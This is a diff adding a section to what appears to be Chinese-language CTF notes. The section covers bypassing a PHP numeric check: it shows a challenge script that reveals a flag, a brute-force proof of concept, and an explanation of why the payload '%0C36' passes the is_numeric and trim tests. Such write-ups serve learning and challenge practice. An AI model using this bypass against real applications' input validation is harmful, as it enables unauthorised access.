@@ -5398,7 +5398,58 @@ payload：
 
 知识点：**include可以不用括号，分号可以用?>代替**
 
+### ASCII码绕过检测
 
+```php
+<?php
+include('flag.php');
+ highlight_file(__FILE__);
+ error_reporting(0);
+ function filter($num)
+ {
+     $num=str_replace("0x","1",$num);
+     $num=str_replace("0","1",$num);
+     $num=str_replace(".","1",$num);
+     $num=str_replace("e","1",$num);
+     $num=str_replace("+","1",$num);
+     return $num; 
+ } $num=$_GET['num'];
+ if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36')
+ {
+    if($num=='36')
+    {
+        echo $flag;
+    }
+    else
+    {
+        echo "hacker!!";
+    } 
+ }
+ else
+ {
+     echo "hacker!!!"; 
+ }
+?>
+```
+
+POC 代码
+
+```php
+<?php 
+for($i = 0; $i<129; $i++)
+{
+     $num=chr($i).'36';
+     if(trim($num)!=='36' && is_numeric($num) && $num!=='36')
+     {
+        echo urlencode(chr($i))."\n"; 
+     } 
+ } 
+?>
+```
+
+```
+urldecode('%0C36')`会被解码为字符串`"\f36"`。当这个字符串在与数字比较时，PHP会尝试将这个字符串转换为数字。在这个转换过程中，PHP会从字符串的开始处读取，直到遇到一个不能被解析为数字的字符。在这个例子中，`\f`（对应于ASCII的换页符）不能被解析为数字，所以它被忽略，剩下的`"36"`被解析为数字36。因此，`urldecode('%0C36') == 36`的结果为`true
+```
 
 # Misc
 
